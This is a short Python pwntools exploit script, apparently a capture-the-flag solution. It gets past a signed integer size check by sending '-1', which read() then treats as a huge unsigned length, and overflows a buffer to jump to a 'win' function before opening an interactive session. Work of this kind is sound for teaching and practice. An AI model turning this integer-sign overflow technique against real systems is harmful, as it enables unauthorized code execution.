from pwn import *
from grwnapy.pwn import find_offset

# Allows you to switch between local/GDB/remote from terminal


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = sys.argv[1]
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                           EXPLOIT
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

offset = find_offset(exe, b"-1\n" + cyclic(500))
win = elf.symbols['win']


# This level's challenge is to bypass a integer check for payload size
# Since the payload size uses signed integers, -1 passes, because its smaller than 54 (the reserved buffer size) 
# However, read() which takes its own size parameters (size_t) wher the type is unsigned.
# This makes -1 actually become a very large integer.

io = start()

io.sendline(b'-1')

payload = flat([b"A"*offset, win])

io.sendlineafter(b'', payload)
io.recvuntil(b'')

io.interactive()
